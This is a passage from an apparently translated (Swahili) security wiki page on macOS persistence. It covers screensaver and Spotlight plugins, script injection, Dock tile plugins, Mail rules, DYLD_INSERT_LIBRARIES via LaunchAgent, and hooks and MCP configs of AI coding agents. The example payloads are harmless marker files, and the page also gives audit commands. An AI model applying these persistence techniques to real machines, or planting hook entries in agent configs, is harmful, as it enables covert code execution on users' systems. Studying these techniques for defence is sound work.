sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Kumbuka kwamba kwa kuwa ndani ya entitlements za binary inayopakia code hii (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`**, utakuwa **ndani ya application sandbox ya kawaida**.

Msimbo wa Saver:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Programu-jalizi za Spotlight

maelezo: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Inafaa kukwepa sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini utaishia ndani ya sandbox ya programu
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox inaonekana kuwa na vizuizi vingi sana

#### Mahali

- `~/Library/Spotlight/`
  - **Kichochezi**: Faili mpya yenye kiendelezi kinachodhibitiwa na programu-jalizi ya Spotlight inapoundwa.
- `/Library/Spotlight/`
  - **Kichochezi**: Faili mpya yenye kiendelezi kinachodhibitiwa na programu-jalizi ya Spotlight inapoundwa.
  - Ruhusa za root zinahitajika
- `/System/Library/Spotlight/`
  - **Kichochezi**: Faili mpya yenye kiendelezi kinachodhibitiwa na programu-jalizi ya Spotlight inapoundwa.
  - Ruhusa za root zinahitajika
- `Some.app/Contents/Library/Spotlight/`
  - **Kichochezi**: Faili mpya yenye kiendelezi kinachodhibitiwa na programu-jalizi ya Spotlight inapoundwa.
  - Programu mpya inahitajika

#### Maelezo na Udukuzi

Spotlight ni kipengele cha utafutaji kilichojengewa ndani ya macOS, kilichoundwa kuwapa watumiaji **ufikiaji wa haraka na wa kina wa data kwenye kompyuta zao**.\
Ili kuwezesha uwezo huu wa kutafuta kwa haraka, Spotlight hudumisha **hifadhidata ya wamiliki** na kuunda faharasa kwa **kuchanganua faili nyingi**, hivyo kuwezesha utafutaji wa haraka kupitia majina ya faili na maudhui yake.<sup>[[25]](#references)</sup>

Utaratibu wa msingi wa Spotlight unahusisha mchakato mkuu unaoitwa 'mds', kifupi cha **'metadata server'.** Mchakato huu huratibu huduma nzima ya Spotlight. Sambamba na huo, kuna daemoni nyingi za 'mdworker' zinazotekeleza kazi mbalimbali za matengenezo, kama vile kuweka aina tofauti za faili kwenye faharasa (`ps -ef | grep mdworker`). Kazi hizi huwezeshwa na programu-jalizi za uingizaji za Spotlight, au **".mdimporter bundles**", ambazo huwezesha Spotlight kuelewa na kuweka maudhui katika aina mbalimbali za fomati za faili kwenye faharasa.

Vifurushi vya programu-jalizi au **`.mdimporter`** viko katika maeneo yaliyotajwa awali. Kifurushi kipya lazima kigunduliwe na kilingane na aina ya faili, na Spotlight lazima iweke faili inayolingana kwenye faharasa; kunakili kifurushi pekee hakuthibitishi kuwa kimepakiwa. [Rejeleo la MDImporter la Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) linaunganisha upakiaji na faili inayostahili ambayo imebadilishwa. Utekelezaji wa programu-jalizi za uingizaji za Spotlight kwenye macOS 26 haukujaribiwa hapa.

Inawezekana **kupata `mdimporters` zote** zilizopakiwa kwa kuendesha:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumika kuchanganua aina hizi za faili (viendelezi `.iba` na `.book` miongoni mwa vingine):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Ukiangalia Plist ya `mdimporter` nyingine, huenda usipate ingizo la **`UTTypeConformsTo`**. Hiyo ni kwa sababu hiyo ni _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) iliyojengewa ndani, na haihitaji kubainisha viendelezi.
>
> Zaidi ya hayo, plugins chaguomsingi za mfumo hupewa kipaumbele kila mara, kwa hiyo mshambulizi anaweza kufikia tu faili ambazo hazijaorodheshwa na `mdimporters` za Apple.

Ili kuunda importer yako mwenyewe, unaweza kuanza na mradi huu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), kisha ubadilishe jina na **`CFBundleDocumentTypes`**, na uongeze **`UTImportedTypeDeclarations`** ili iunge mkono kiendelezi unachotaka, na uviakisi kwenye **`schema.xml`**.\
Kisha **badilisha** msimbo wa function **`GetMetadataForFile`** ili kutekeleza payload yako faili yenye kiendelezi kinachochakatwa inapoundwa.

Hatimaye, **jenga na nakili `.mdimporter`** yako mpya kwenye mojawapo ya maeneo matatu yaliyotajwa awali. Unaweza kuangalia kama imepakiwa kwa **kufuatilia logs** au kwa kuendesha **`mdimport -L`**.

> [!TIP]
> Ingawa sandbox ya importer ina vizuizi vikali sana, `mdworker` huorodhesha faili ikiwa na **ruhusa za usomaji wa kiwango cha juu**. Kwa hiyo, `.mdimporter` hasidi inaweza kusoma *maudhui* ya faili zilizo kwenye maeneo yanayolindwa na TCC (Downloads, Pictures, Desktop, …) na kutoa metadata iliyokusanywa bila kuonyesha kidokezo chochote cha TCC — **"Sploitlight" TCC bypass (CVE-2025-31199)**, iliyorekebishwa katika macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Kidirisha cha Mapendeleo~~

> [!CAUTION]
> Inaonekana kuwa hii haifanyi kazi tena.

Maelezo: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Husaidia kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Inahitaji hatua mahususi kutoka kwa mtumiaji
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Maelezo

Inaonekana kuwa hii haifanyi kazi tena.<sup>[[26]](#references)</sup>

### Faili za Script za Programu

Maelezo: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Husaidia kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini programu inayolengwa lazima iwe imesakinishwa na mwathiriwa lazima aiendeshe/aitumie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

Script iliyotafsiriwa ambayo programu au zana iliyosakinishwa huitekeleza, na ambayo mhusika anaweza kuibadilisha. Thibitisha ruhusa za faili na njia inayoita script; kupata faili la `.sh` au `.py` pekee haitoshi. [Mwongozo wa Apple wa kusaini msimbo](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) unasema kwamba app bundles zilizosainiwa hufunga rasilimali, zikiwemo scripts. Kuhariri script iliyo ndani ya bundle huvunja kifungo hicho na kunaweza kugunduliwa au kuzuiwa wakati bundle inathibitishwa. Script ya nje kama launcher ya Homebrew ina tabia tofauti ya kusaini na kuaminika. Mifano ya kihistoria kutoka kwenye maelezo hayo ni pamoja na:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – script iliyotumiwa na matoleo ya zamani ya Sublime Text; faili hilo na matumizi yake wakati wa kuanza lazima yakaguliwe kwa toleo lililosakinishwa. Halikuwepo kwenye Mac ya majaribio.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) au **`/usr/local/bin/brew`** (Intel) – launcher ya Bash inayotekelezwa njia hiyo ya `brew` inapoombwa, ikiwa imesakinishwa na mhusika ana ruhusa ya kuiandika. `/opt/homebrew/bin/brew` ilikuwa script ya Bash inayoweza kuandikwa kwenye Mac ya majaribio; hilo ni uchunguzi wa ndani, si kanuni ya jumla ya ruhusa za Homebrew.
- **`idlemain.py` ya IDLE** ndani ya app bundle ya Python – inaweza kuhitaji ruhusa za admin ili kuiandika, lakini huendeshwa kwa utambulisho wa mtumiaji wa IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – script ya shell ya kihistoria iliyokuwa ikiendeshwa kama root wakati kazi inayolingana ya `org.wireshark.ChmodBPF` ya launchd imesakinishwa. Script na kazi hiyo havikuwepo kwenye Mac ya majaribio.

#### Maelezo na Unyonyaji

Baadhi ya zana na programu huendesha scripts zilizotafsiriwa wakati wa utekelezaji. Script inayoweza kuandikwa inaweza kutekeleza amri zilizoongezwa wakati caller wake mahususi itakapoendeshwa tena, mradi uthibitishaji wa saini, quarantine na ukaguzi mwingine uruhusu. Utafiti wa awali ulionyesha usakinishaji kadhaa wa mwaka 2019; kagua tena njia na vichochezi vyake kwenye toleo lengwa.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Jaribio hili la kunakili lilitoa `marker fired: True` kwenye macOS 26.5.2; launcher asili haikuguswa. Linathibitisha kuwa sehemu ya kuingiza hutekelezwa kwenye nakala, si kwamba app bundle iliyosainiwa na kurekebishwa au usakinishaji halisi wa Homebrew ungefaulu ukaguzi wote wa uzinduzi.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Inasaidia kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Inahitaji app inayotangaza plug-in igunduliwe/ijasajiliwe na ichakatwe na Dock
  - Plugin hupakiwa ndani ya helper **iliyosainiwa na Apple** ambayo haina entitlement ya app-sandbox na **uthibitishaji wa library umezimwa**. Helper huyu hakuonyeshwa kwenye UI ya Background Task Management katika utafiti uliorejelewa; inapaswa kuthibitishwa kama ataonekana kwenye toleo lengwa.
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, inayorejelewa kwa ufunguo wa **`NSDockTilePlugIn`** katika `Info.plist` ya app; `Info.plist` ya plugin yenyewe huweka **`NSPrincipalClass`**.

#### Maelezo na Exploitation

App inapotangaza `NSDockTilePlugIn`, Dock inaweza kupakia bundle inayorejelewa ndani ya XPC helper **`com.apple.dock.external.extra`** (`...extra.arm64` kwenye Apple Silicon) wakati wa kuingia au tile yake inapoongezwa; si lazima app yenyewe izinduliwe. Hili linahitaji app igunduliwe/ijasajiliwe na kukubaliwa na macOS. Helper huyo **amesainiwa na Apple**, hana entitlement ya `com.apple.security.app-sandbox`, na ana `com.apple.security.cs.disable-library-validation`. Mbinu ya **`setDockTile:`** ya principal class huitwa inapopakiwa; kuanzia hapo, inaweza kujisajili kupokea distributed notifications (k.m. `com.apple.screenIsLocked`) kwa matukio ya baadaye.<sup>[[38]](#references)</sup>

Kwenye macOS 26.5.2, ukaguzi wa kusoma pekee wa `codesign` ulithibitisha sahihi na entitlements za Apple za helper huyo, na app kadhaa zilizosakinishwa zilitangaza `NSDockTilePlugIn`. Hakuna plugin mpya iliyosakinishwa au kupakiwa kwenye Mac hiyo, kwa hivyo utekelezaji wa bundle mpya iliyoandikwa kwenye toleo hilo bado haujajaribiwa.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Hufaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension huendeshwa katika **process yake yenyewe**, na kuongeza moja hakusababishi alert ya Background Task Management
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist iko ndani ya container iliyolindwa na TCC, kwa hivyo kuihariri kutoka nje kunahitaji Full Disk Access au TCC bypass

#### Mahali

- Bundle ya widget extension: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Widgets zinazotumika/zilizosajiliwa: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (keys `widgets.instances` na `widgets.widgets`)

#### Maelezo na Exploitation

WidgetKit extension iliyojumuishwa ndani ya app huendeshwa katika **process yake yenyewe** inayosimamiwa na Notification Center. Kusajili instance katika `widgets.instances` (blob ya `CHSWidget` iliyosimbwa kwa base64 kwa kutumia `NSKeyedArchiver`, yenye data ya `INIntent` iliyopachikwa) na kuwasha upya NotificationCenter husababisha widget kupakiwa na kutekeleza msimbo wake wa `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Kanuni za Mail.app (Run AppleScript)

Maelezo: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini Mail.app lazima iwe imesanidiwa kwa akaunti na iwe inaendeshwa; trigger ni barua pepe inayoingia
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Kuhariri rules/scripts kutoka nje ya Mail kunaweza kuhitaji Mail ifungwe na Full Disk Access kwenye macOS za kisasa

#### Mahali

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (rules za ndani; `V10` kwenye Sonoma/Sequoia, `V11`+ kwenye matoleo mapya zaidi)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (rules zinazosawazishwa na iCloud, ndizo hutangulizwa)
- Uwezeshaji wa rules: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Maelezo na Unyonyaji

Apple Mail **rule** inaweza kuwa na kitendo cha *"Run AppleScript"*. Kwa kuongeza rule inayolingana na **subject line** iliyoundwa mahsusi na kuendesha script ya mshambuliaji, adui hupata uwezo wa kutekeleza code kwa mbali na kwa siri katika muktadha wa Mail kila barua pepe maalum inapowasili — hii ni vector inayokwepa scanners nyingi za persistence kwa sababu hakuna LaunchAgent/Login Item inayoundwa.<sup>[[42]](#references)</sup> Kuweka rule ifute pia barua pepe ya trigger huficha ushahidi. Watetezi wanaweza kuitafuta moja kwa moja:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Profaili za Usanidi (.mobileconfig)

Maelezo: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Hufaa kwa kupita sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - macOS za kisasa zinahitaji **idhini ya mtumiaji mwenyewe** katika System Settings → *Device Management* (`profiles install` ya kimyakimya haipatikani tena nje ya MDM)
- Kupita TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Profaili zilizosakinishwa hupatikana chini ya **`/Library/Managed Preferences/`** na **`/var/db/ConfigurationProfiles/`**; profaili ni XML plist iliyo na safu ya `PayloadContent`.

#### Maelezo na Unyonyaji

`.mobileconfig` si njia ya moja kwa moja ya kutekeleza msimbo, lakini inaweza kuhifadhi usanidi kama vile **root CA inayoaminika** (`com.apple.security.root`), **proxy ya kimataifa au ya PAC** (`com.apple.proxy.*`), **mapendeleo yanayodhibitiwa** (`com.apple.ManagedClient.preferences`), au vizuizi. Kwenye macOS 10.15 na matoleo ya baadaye, ufafanuzi wa Apple wa [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) unasema kwamba ikiwekwa kuwa `true` kwenye profaili **iliyowekwa mwenyewe** bila payload ya nenosiri la kuiondoa, uthibitishaji wa **msimamizi** unahitajika ili kuiondoa; hilo halifanyi profaili hiyo isiweze kuondolewa kabisa. Profaili zilizowekwa na MDM zina sheria tofauti za usimamizi na uondoaji.<sup>[[44]](#references)</sup>

> [!WARNING]
> Profaili ya kawaida ya usanidi **haina aina ya payload inayosakinisha `LaunchDaemon`/`LaunchAgent` yoyote kiholela**. Kusakinisha daemon kwa njia hiyo kunahitaji **usajili kamili wa MDM** pamoja na agent/script ya usimamizi — usichukulie `.mobileconfig` kuwa njia ya kusambaza launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Uendelevu wa DYLD_INSERT_LIBRARIES

- Inafaa kukwepa sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **huondoa** `DYLD_*` kwa binary za SIP/jukwaa, app za hardened-runtime na targets za setuid, kwa hivyo huingiza tu kwenye process zisizolindwa na **haikwepi** SIP/hardened runtime
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Njia ya kuaminika: dict ya **`EnvironmentVariables`** ndani ya plist hasidi ya `LaunchAgent`/`LaunchDaemon` (huendeshwa wakati wa kuingia/kuwasha)
- Zilizopitwa na wakati/za kihistoria (kwa taarifa pekee): **`~/.MacOSX/environment.plist`** (iliondolewa katika 10.8) na **`/etc/launchd.conf`** (iliondolewa katika 10.10)

#### Maelezo na Unyonyaji

Ikiwa mshambuliaji anaweza kuweka `DYLD_INSERT_LIBRARIES` kwenye mazingira ya process ya mwathiriwa, dyld hupakia dylib ya mshambuliaji (constructor yake huendeshwa) ndani ya process hiyo. Toleo endelevu huweka variable hiyo ndani ya LaunchAgent ili kila uzinduzi wa job uiingize tena. Kumbuka kuwa `launchctl setenv DYLD_*` huchujwa kwenye macOS za kisasa, kwa hivyo iweke kwenye plist badala yake.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Kwa maelezo kamili ya mechanics za dylib injection/hijacking tazama:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs (hooks, MCP servers, rules files)

Maandishi: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Inahitaji developer atumie agent husika. Amri za startup huendeshwa zikiwa na privileges za mtumiaji huyo agent inapokubali usanidi wake; uaminifu wa workspace na idhini ya MCP hutofautiana kulingana na product na session mode.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (huendeshwa kama mtumiaji; hurithi chochote ambacho terminal/agent tayari inacho)

#### Mahali

Faili dhahiri za usanidi wa hook na MCP zinaweza kusababisha **shell commands au child processes kuendeshwa developer anapotumia tool** — ama kutoka kwenye faili ya global ya mtumiaji mmoja (persistence) au faili iliyowekwa kwenye repo (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, na editor rules ni **maelekezo kwa agent**, si uhakika wa kuendesha shell inapoisoma; athari yake hutegemea tabia ya agent na ruhusa za tools. Kagua sheria za sasa za trust na approval za kila product.

- **Claude Code**
  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json`, na **`/Library/Application Support/ClaudeCode/managed-settings.json`**, inayoweza kufikiwa na root pekee (MDM/managed settings **haziwezi kubatilishwa** na mtumiaji → persistence imara)
  - Object ya `hooks` — events `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — kila moja huendesha shell `command`
  - `statusLine.command` — shell command inayotekelezwa ili kuonyesha status line (kila session)
  - MCP servers katika `~/.claude.json` / project `.mcp.json` — `command`+`args` huzinduliwa kama child processes
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — maelekezo yanayoweza kujaribu prompt injection, kulingana na tabia ya agent na ruhusa za tools
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` huzinduliwa kama children); maelekezo ya project katika `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … huendesha commands); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Maelezo na Exploitation

Ikiwa actor anaweza kurekebisha settings za global za mtumiaji wa account, commands zake za hook au MCP zinaweza kuendeshwa katika sessions zijazo chini ya account hiyo. Config inayodhibitiwa na repository ni hali tofauti: [nyaraka za sasa za usalama za Claude Code](https://code.claude.com/docs/en/security) zinaeleza dialog shirikishi ya workspace trust na prompt tofauti ya approval kwa servers za project `.mcp.json`. [Permission matrix yake](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) inasema hooks zinaweza kuendeshwa baada ya folder ya parent kuaminiwa, na sessions za `claude -p`/SDK hazionyeshi prompt shirikishi ya trust; project MCP servers huunganishwa bila prompt ya approval katika modes hizo zisizo shirikishi. Bypass ya project hook kabla ya trust iliyoripotiwa kama CVE-2025-59536 [ilirekebishwa mwaka 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); usiichukulie kuwa tabia ya sasa ya kawaida. Njia za uwasilishaji zinaweza kujumuisha repository iliyoathiriwa au installer hasidi. Prompt injection kupitia rules file haitabiriki kama hook dhahiri na bado hutegemea idhini za tools.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Mfano wa settings za Claude Code za global za mtumiaji; weka hii tu kwenye account ya muda unapoifanyia majaribio:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Mfano wa usanidi wa Codex MCP wa kiwango cha mtumiaji wote:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Mfano wa usanidi wa hook ya Cursor; angalia schema ya toleo lake lililosakinishwa kabla ya kuitumia:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Viendelezi vya Kivinjari (Chromium: Chrome / Brave / Edge)

Maelezo: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Matumizi mabaya ya ExtensionInstallForcelist kwenye macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Hufaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Inahitaji kivinjari kinachoauniwa na extension iliyosakinishwa na kuwashwa. External Extensions kwenye macOS huhitaji mtumiaji kuthibitisha; force-install inayosimamiwa huhitaji enterprise policy inayotumika.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Hii ni tofauti na **native messaging hosts** (tazama sehemu ya *Chrome native messaging hosts* hapo juu). Hapa persistence ni **extension inayosakinishwa kiotomatiki** yenyewe.

#### Mahali

- **Faili za JSON za External Extensions** (hugunduliwa kivinjari kinapoanza, kisha mtumiaji huombwa kuiwasha kwenye macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (per-user) au `/Library/Application Support/Google/Chrome/External Extensions/` (watumiaji wote)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Force-install kupitia enterprise policy** kwa kutumia managed preferences / configuration profile:
  - Kitufe cha `ExtensionInstallForcelist` cha `com.google.Chrome` (`com.brave.Browser` kwa Brave, `com.microsoft.Edge` kwa Edge), husomwa kutoka `/Library/Managed Preferences/` au `.mobileconfig` iliyosakinishwa

#### Maelezo na Unyonyaji

